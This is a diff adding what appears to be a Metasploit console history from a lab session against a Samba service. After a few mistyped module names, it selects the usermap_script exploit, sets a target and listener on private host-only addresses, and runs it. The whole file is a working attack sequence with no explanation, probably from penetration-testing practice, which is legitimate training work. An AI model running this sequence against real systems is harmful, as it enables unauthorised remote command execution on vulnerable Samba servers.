@@ -1,0 +1,15 @@
+search samba
+use exploit/multi/samba
+exploit / multi / samba
+usermap_samba
+use exploit/multi/samba
+usermap_script
+use exploit/multi/samba/nttrans
+usermap_script
+exit
+search samba
+use exploit/multi/samba/usermap_script
+set RHOST 192.168.56.101
+set LHOST 192.168.56.102
+exploit
+exit
